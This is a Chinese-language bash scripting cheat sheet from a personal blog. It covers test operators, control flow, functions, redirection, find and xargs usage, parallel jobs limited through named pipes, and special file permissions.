[[]]中使用需要转义,macOS中不可用此种方式\n1  a=2;b=6; [ $a \\\u0026gt; $b ]; echo $?   字符串测试操作符号 1  str=Tom ;[ -z \u0026#34;$str\u0026#34; ]; echo $?     [ str ] : $str不为空,返回真\n  [ -z str ] : $str长度为0,返回真\n  [ -n str ] : $str长度不为0,返回真\n  [ str1 = str2 ] : 测试str1与str2相等,返回真\n  [ str1 != str2 ] : 测试str1与str2不想等,返回真\n  [[ str1 == str2 ]] : 测试str1与str2相同,返回真\n  [[ str1 != str2 ]] : 测试str1与str2不相同,返回真\n  [[ str1 =~ str2 ]] : str2是str1的子串,返回真\n  [[ str1 \u0026gt; str2 ]] : str1 大于str2,返回真\n  [[ str1 \u0026lt; str2 ]] : str1小于str2,返回真\n  逻辑运算符 三元表达式:  [ ] \u0026amp;\u0026amp; echo T || echo F\n 常用方式:   [[ pattern1 \u0026amp;\u0026amp; pattern2 ]] : 逻辑与 [[ pattern1 || pattern2 ]] : 逻辑或 [[ !pattern ]] : 逻辑非  不常用方式:   [ expr1 -a expr2 ] : and [ expr1 -o expr2 ] : or [ !expr ] : 非！  1  x=1;name=Tom; [ $x -eq 1 -a -n $name ]; echo $?   文件测试操作符号   [ -b fname ] : fname为块设备,返回真\n  [ -c fname ] : fname为字符设备,返回真\n  [ -p fname ] : fname为命名管道,返回真\n  [ -S fname ] : fname为Socket,返回真\n  [ -s fname ] : fname存在且size\u0026gt;0,返回真\n  [ -f fname ] : fname存在且是普通文件,返回真\n  [ -L fname ] : fname存在且是链接文件,返回真\n  [ -e fname ] : fname(文件或目录)存在,返回真\n  [ -d fname ] : fname存在且是目录,返回真\n  [ -r fname ] : fname(文件或目录)存在且可读,返回真\n  [ -w fname ] : fname(文件或目录)存在且可写,返回真\n  [ -x fname ] : fname(文件或目录)存在且可执行,返回真\n  流程控制语句 顺序语句 程序会顺序来执行代码，从上往下一行一行执行\n分支语句 条件测试语句格式：\n [  ] 等效于test \n[[  ]]\n 区别：\n [] 不支持逻辑运算符、正则表达式 [[]] 支持逻辑运算符\u0026amp;\u0026amp;、||、!、和()，支持正则表达式匹配  if型  if语句可嵌套使用 必须以if开头，fi结尾 elif 可以有0个或多个 else最多只能有个一个 commands为可执行语句块,shell提供空命令: ; 相当于命令换行  1 2 3 4 5 6 7 8 9 10 11 12 13 14  if [ expr1 ]; then \u0026lt;commands1\u0026gt; #expr1为真时，执行commands1 elif [ expr2 ]; then \u0026lt;commands2\u0026gt; # expr1为假，expr2为真时，执行commands2 elif [ expr3 ]; then \u0026lt;commands3\u0026gt; # expr1到expr2为假，expr3为真时，执行commands3 ... elif [ exprn ]; then \u0026lt;commandsn\u0026gt; # expr1到expr(n-1)为假，exprn为真时，执行commandsn else \u0026lt;command\u0026gt; # 当expr(1-n)都为假时，执行command  fi   case型 1 2 3 4 5 6 7 8 9 10 11  case $expr in pattern1) # 若expr与pattern1匹配, commands1 # 执行语句块commands ;; # 跳出case结构 pattern2) commands2 ;; *) # 若expr与上面的pattern均不匹配 commands ;; esac # case语句必须以easc终止   select型  while+case语句可实现select\n 1 2 3  select answer in \u0026lt;list\u0026gt;; do commands # 循环变量answer每取一次值，循环体commands就执行一遍 done # 循环结束标志   循环语句  break 强行退出本层循环。 break [n] 退出第几层循环(最里面为第一层循环) continue 忽略本次循环的剩余部分，回到循环的顶部,继续下一次循环。 continue [n] 回到第n次循环的顶部  for循环  python格式  1 2 3  for item in list ; do commands done    C语言格式(不常用)  1 2 3 4  for ((i=0;i\u0026lt;100;i++)) do echo $i done   while循环  与until作用相反\n 1 2 3  while expr ; do # 执行expr表达式是否为真 commands # 循环体语句 done [\u0026lt; test.file] # 循环结束标志,返回循环顶部   until循环  与while作用相反\n 1 2 3 4  until expr ; do # 执行expr表达式是否为假, expr为真退出循环 commands # expr退出状态为假, 执行循环体commands done # 循环体结束标志, 返回循环顶部   函数 关键字function和重定向命令可选\n1 2 3 4 5 6 7 8 9 10 11  [function] myfun(){ commands # body of the funtion goes here [break] # 退出当前函数 [exit \u0026lt;n\u0026gt;] # 退出整个脚本 [return \u0026lt;n\u0026gt;] # 退出当前函数。未指定n，则返回函数最后一条milling执行后所返回的状态  } [重定向] myfun [arg1 arg2 ... argn] # 运行函数,arg参数通过位置参数$n传入 echo $? # 查看函数myfun返回值   ⚠️\n 作用域: 函数内的变量的作用域默认是全局的，可使用local限定作用域于函数内 函数定义中不必声明参数个数，参数个数由此函数被调用时给定。  调试 打印变量 1 2 3 4 5 6 7 8  #! /bin/bash echo $var ; exit # 单独调试某个变量  trap \u0026#34;echo a=$ab=$b\u0026#34; EXIT # 程序退出打印程序内的变量  a=20 b=30 exit   sh命令参数 1 2 3 4  bash [-n | -v | -x] \u0026lt;file.sh\u0026gt; -n : 仅模糊检查语法错误,不执行file.sh脚本。 -x : 打印每条命令的结果   Tips  help 查看shell内置命令  1 2 3  ssh myserver ps \u0026gt; /tmp/ps.out #重定向到本地/tmp目录 ssh myserver ps \\\u0026gt; /tmp/ps.out #重定向到服务器/tmp目录     . aa.sh : 在当前shell环境下执行aa.sh内的命令  子shell运行  export \u0026lt;variables\u0026gt;[=value] : 导出指定变量到子shell中  1  var1=value1 var2=value2 ... varn=valuen command   将var[1-n]及其值放入到command环境中,执行command。当前shell不存在变量var[1-n]\n异步执行 wait [PID] wait [PID] # 不写PID, 则shell会等待所有的子进程执行完毕。在子进程执行完毕前,当前shell会被挂起。 命令组  (commands ...) : 在子shell中运行 { command;..;} : 在当前shell中运行, 开头有空格,命令后带;  转义符\\ 转义就是转成字符字面含义\n\\x : 使用x字符的字面意义。\n引号'' \u0026quot;\u0026quot;  '' 单引号不能嵌套,引号内的所有字符转义,即保持字面含义。 \u0026quot;\u0026quot; 双引号内的字符,含有转义符\\ 后跟$、`、\u0026quot; 、\\保持特殊含义，不转义。  参数左移shift [n]  shell命令将shell程序的参数$1 \u0026hellip;$n分别向左移动n位。\n单字符参数处理getopts 1  getopts \u0026lt;optstring\u0026gt; \u0026lt;opt\u0026gt; [arg...]    optstring : 代表参数字符串, 开头含有:,表示不打印错误信息  eg: aa.sh -a -b -p value optstring就是abp: , -a -b为开关型选项 当getopts匹配到-p参数时, value会被存放在shell内置变量OPTARG中   opt : getopts存放参数名的变量, 参数对应的值存在OPTARG  每次执行getopts,会从命令行中获取下一个参数，存放在name中 如果获取的参数不在optstring中, name的值为?   arg : 默认是$@, 即shell脚本的全部参数 OPTIND : 存放所有参数的下标, 开关型参数下标=1 含参型下标=2  多字符参数处理getopt shell环境变量  HOME : 存放用户主目录的完整路径名 PATH : shell执行命令时顺序搜索可执行文件 TERM : 终端类型 UID : 当前用户标识 PS1 : 主提示符 PS2 : 辅助提示符 PS4 : set -x 模式下的提示符,默认+ IFS : 输入域分隔符  重定向    形式 含义     \u0026lt; file 标准输入重定向到file,将file内容输入到终端里   \u0026gt; file 标准输出重定向到file   command \u0026lt; file1 \u0026gt;file2 将 file1 作为 command 的输入，并将 command 的处理结果输出到 file2。     重定向标准输出及标准错误  1  `commands`\u0026gt;file 2\u0026gt;\u0026amp;1 等效于 \u0026amp;\u0026gt;file 等效于 \u0026gt;\u0026amp;file   按照重定向符号的顺序自左至右执行，\n首先标准输出重定向至file中，\n2\u0026gt;\u0026amp;1 表示将标准错误重定向至标准输出\n 追加重定向标准输出及标准错误  1  `command` \u0026gt;\u0026gt; file 2\u0026gt;\u0026amp;1 等效于 \u0026amp;\u0026gt;\u0026gt; file   命令替换 将命令的输出作为命令替换位置的文本\nvar=ps -ef |wc -l\nvar=$(ps -ef | wc -l)\n ${} :用于定义变量 $() : 用于命令替换,等效于` ` $[ ]  和$(()): 用于整数运算  脚本执行结束清理缓存文件 1 2 3 4 5 6 7 8 9 10 11 12  #!/bin/bash  # trap捕捉到EXIT信号时执行rm -f \u0026#34;$TMPFILE\u0026#34; 命令 # 最好放在shell脚本的开头 # trap \u0026lt;command | function \u0026gt; \u0026lt;SIGNAL\u0026gt; SINGAL2 ...SINGALN trap \u0026#39;rm -f \u0026#34;$TMPFILE\u0026#34;\u0026#39; EXIT TMPFILE=$(mktemp) || exit 1 ls /etc \u0026gt; $TMPFILE if grep -qi \u0026#34;kernel\u0026#34; $TMPFILE; then echo \u0026#39;find\u0026#39; fi   根据扩展名切分文件名 文件名格式:name.extention\n % : 提取文件名name部分 # : 提取文件名extention部分  1 2 3 4  file=\u0026#34;sample.jpg\u0026#34; echo \u0026#34;文件名: ${file%.*}\u0026#34; # 从file中删除位于%右侧通配符(.*)匹配到的字符,匹配方向从右向左匹配,非贪婪模式,贪婪模式加%% echo \u0026#34;扩展名: ${file#*.}\u0026#34; # 从file中删除位于#右侧通配符(*.)匹配到的字符串,匹配方向从左到右匹配,非贪婪模式,贪婪模式加##   shell命令行使用vi行编辑模式 修改命令时，不管处于哪种模式，按下Enter就会解释当前命令。\n1  set -o vi/emacs   set命令切分字段 1 2 3 4 5 6  aa=\u0026#34;aa bb cc\u0026#34; # set $aa会将aa的值根据IFS来切分赋给位置参数 set $aa echo $1 echo $2 echo $3   GUI界面Dialog 终端颜色 tput显示颜色  tput setab \u0026lt;num\u0026gt; : 设置背景色 tput setaf \u0026lt;num\u0026gt; : 设置前景色                \u0026lt;num\u0026gt; 0 1 2 3 4 5   color 黑 红 绿 黄 蓝 洋红    1 2 3 4  RED=$(tput setaf 1) GREEN=$(tput setaf 2) RESET=$(tput sgr0) # sgr0 表示颜色重置 echo \u0026#34;${RED}red text ${GREEN}green text${RESET}\u0026#34;   bash注释 单行注释 # 1 2 3  # 单行注释符 : commnets here   多行注释  方式一  1 2 3 4 5  \u0026lt;\u0026lt; COMMENT comment here .... comment here COMMENT   方式二  1 2 3 4 5  :\u0026#39; commnet here ... commnet here \u0026#39;   后台运行 1  \u0026lt;command\u0026gt; # 按下ctrl-z即可挂起该进程    fg : 在前台恢复执行当前作业 bg : 在后台恢复执行当前作业  切换目录cd -  - 表示上一个目录  开发规范 1 2 3 4 5 6  # Date: 2020-8-8 8:8:8 # Author: askDing # Blog: https://askding.github.io # # Version: 1.1 # Description:    分割/合并文件  分割文件  1 2 3 4 5 6 7 8 9  cut -f \u0026lt;col_list\u0026gt; -d \u0026#39;;\u0026#39; --complenment --output-delimiter \u0026#39;-\u0026#39; file # 按列切分文件 -f 指定待提取的列号 # -d 指定分隔符 # --complenment 输出-f指定之外的所有列 # --output-delimiter 指定输出分隔符 split [-b size] [-d [-a \u0026lt;num\u0026gt;]] file # -b指定分割文件的大小10k、10M、10G、 # -d 以数字为后缀 # -a num 指定后缀的长度    合并文件  1 2  cat file1 file2 ... \u0026gt; file_total # 按行合并文件 paste file1 file2 ... -d \u0026#39;,\u0026#39; # 按列合并文件,-d指定分隔符   cat的特殊用法 1  echo \u0026#34;aa bb cc\u0026#34; | cat - other_file # - 作为stdin文本的文件名   终端截图 1 2 3  xwd -root -out /tmp/xwd_test.xwd # 截取整个屏幕,不需要鼠标选择区域 xwud -in /tmp/xwd_test.xwd # 查看截屏文件 convert /tmp/xwd_test.xwd /tmp/xwd_test.png # 转换成png格式图片   script录制终端会话 1 2 3  script -t 2\u0026gt; rec.time -a rec.his # 开始录制 -t 记录时序 -a 追加输出到文件, -a可忽略 exit # 结束录制 scriptreplay -t rec.time -s rec.his # 回放 -t -s可省略   termtosvg生成svg动画 termtosvg\n1 2 3  brew install termtosvg termtosvg exit   find命令技巧 1 2 3 4 5 6  find . -type f -name \u0026#34;*.a\u0026#34; -print0 -exec rm {} \\; find . \\(-path \u0026#34;./code\u0026#34; -o -path \u0026#34;./code2\u0026#34; \\) -prune -o -name \u0026#34;*.txt\u0026#34; -print //在当前目录及除code和code2之外的子目录中查找txt文件 # 可用于删除-开头的文件,  # -print0 使用0(NULL)字符分割查找到的元素 # {}代表find出的文件名  # \\; 对;进行转义,代表rm命令的结束   xargs命令技巧 一般情况下可使用``来执行命令，然后将其输出作为命令行参数，达到使用只能接收命令行参数的命令,\n但需要处理的文件过多,会出现\u0026quot;Argument list too long\u0026quot;的错误。可使用xargs来解决\n1 2 3 4 5 6  \u0026lt;command1\u0026gt; | xargs [-n] [-d \u0026#39;X\u0026#39;] [-I {}] [command2 -p {} -l] # -n 限制每行输出n个元素, 输出m行,command2命令执行m次  # -d \u0026#39;X\u0026#39; 以X作为分隔符分割command1输出的内容 # -I {} 以{}位置作为xargs传递给command 的参数位置 # 使用-I时,command2以循环的方式执行。如果m=3，command2连同{}一起执行3次,{}会在每次执行中被替换为相应的参数   xargs 紧跟在管道操作符|之后, 默认使用执行/bin/echo。\n将数据以空格或换行符分隔成单个元素，然后调用指定命令并将这些元素作为该命令的参数, 类似于find -exec\n1 2 3  cat target.txt | xargs # 多行输入转单行输出 cat args.txt | xargs -I {} ./aa.sh -p {} -l # -I {} 指定aa.sh命令执行时替换字符串的位置标识 find /smbMount -iname \u0026#34;*.docx\u0026#34; -print0 | xargs -0 grep \u0026#34;askDing\u0026#34; # -iname 忽略大小写, -print0 -0都是以0作为分隔符    并发执行()\u0026amp;/{}\u0026amp; 主要方法是使用 \u0026amp; 符号，将命令fork到后台执行,然后配合wait等待进程结束\n1 2 3 4 5 6 7 8 9 10  for ip in 192.168.8.{1..255}; do ( ping $ip -c2 \u0026amp;\u0026gt; /dev/null if [ $? -eq 0 ]; then echo $ip is alive fi )\u0026amp; done wait   利用管道和文件描述符FD_id实现并发数控制  FD关联命令管道,具有管道特性，并且可以 无限存不阻塞，无限取不阻塞，而不用关心管道内是否为空，也不用关心是否有内容写入 命名管道控制并发数 操作FD   创建一个管道并用指定FD_ID打开 mkfifo /tmp/$$.fifo; exec 3\u0026lt;\u0026gt;/tmp/$$.fifo 以当前进程PID创建fifo文件，防止冲突 循环向FD_ID(关联到管道)输入任意字符(建议echo输入空白字符\\n) \u0026gt;创建进程数 在循环体中，通过read -u \u0026lt;文件描述符\u0026gt; 读取管道中的数据，执行命令，然后echo \u0026gt;\u0026amp;FD_ID,补充进程数 \u0026gt;执行程序 全部任务完成后，exec FD_ID\u0026lt;\u0026amp;- \u0026amp;\u0026amp; exec FD_ID\u0026gt;\u0026amp;- 关闭管道  mkfifo介绍 管道具有存一个读一个，读完一个就少一个，没有则阻塞，放回的可以重复取，这正是队列特性\n1 2 3 4  [ -e /tmp/$$.fifo ] || mkfifo /tmp/$$.fifo # 创建命名管道 exec 3\u0026lt;\u0026gt; /tmp/$$.fifo # 将FD关联到管道 rm -rf /tmp/$$.fifo # 删除管道文件，FD具有管道的一切特性，可通过FD来操作 echo \u0026gt;\u0026amp;8 # 向FD内输入`\\n`   exec命令、操作文件描述符  exec操作命令或脚本时：   exec xx.sh : xx.sh会替换当前进程, 执行xx.sh，就不会再返回调用exec的程序。  exec操作文件描述符时：   exec 3\u0026lt;/tmp/1.txt 以只读方式打开/tmp/1.txt文件，文件描述符为3 exec 3\u0026gt;/tmp/1.txt 以只写方式打开/tmp/1.txt文件，文件描述符为3 exec 3\u0026lt;\u0026gt;/tmp/1.txt 以读写方式打开/tmp/1.txt文件，文件描述符为3 exec 3\u0026lt;\u0026amp;- 关闭文件描述符3的读 exec 3\u0026gt;\u0026amp;- 关闭文件描述符的写  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  #!/bin/bash  thread=10 # 定义进程数 start_time=`date +%s` [ -e /tmp/$$.fifo ] || mkfifo /tmp/$$.fifo # 创建命名管道文件 exec 3\u0026lt;\u0026gt; /tmp/$$fifo # 创建FD 3，以可读（\u0026lt;）可写（\u0026gt;）的方式关联管道文件，FD 3具有命名管道的特性 rm -rf /tmp/$$fifo # 删除命名管道文件，通过FD 3 for i in $(seq $thread); do echo \u0026gt;\u0026amp;3 # 循环$thread次向FD 3写入\\n , 类比一个令牌  done for i in $(seq 1000); do read -u 3 # 循环读取FD 3中取\\n , 直到读取位置 { # 需要并行执行的命令放在此处 sleep 1 \u0026amp;\u0026amp; echo \u0026#34;$iDone\u0026#34; # 最后需要归还令牌 echo \u0026gt;\u0026amp;3 # 再次向FD 3写入\\n , 类似归还令牌 }\u0026amp; # 并发执行标志{}\u0026amp;，fork放在后台执行 done wait # 等待并发进程执行完毕，执行后续命令  stop_time=`date +%s` echo \u0026#34;TIME: `expr $stop_time-$start_time`\u0026#34; exec 3\u0026lt;\u0026amp;- # 关闭FD 3的读 exec 3\u0026gt;\u0026amp;- # 关闭FD 3的写   监视命令输出 1  watch [-d] [-n \u0026lt;num\u0026gt;] command # 每隔num秒更新一次command命令的输出, -d 标记输出差异   特殊文件权限 S t/T 权限模式\n   文件类型 所有者 所属组 其他用户     -/b/c/d/l/p/s r w x r w x r w x    特殊权限均出现在执行权限(x)的位置\n setuid权限 允许其他用户执行此(ELF格式的二进制)文件会以文件拥有者的权限来运行 -rwS------  1  chmod u+s executeable_file    setgid权限 其他用户运行此文件时具有所属组权限----rwS---  1  chmod g+s directory_name/executeable_file #一般设置目录 ,该目录下的文件集成该目录的属性    目录sticky bit 针对其他用户设置的,只有目录/文件所有者和root才能删除的文件-------rwt或---------T 如/tmp目录  t 表示目录内文件有可执行权限 T 表示目录内文件无可执行权限    1  chmod o+t \u0026lt;directory_name\u0026gt;   正则表达式可视化工具 Regexpr\n\n对别名进行转义 在不可信环境下执行特权命令时，在命令前加上\\忽略可能存在的别名\n","description":"","id":68,"section":"blog","tags":null,"title":"bash_basic","uri":"http://crkmythical.github.io/blog/bash-basic/"}]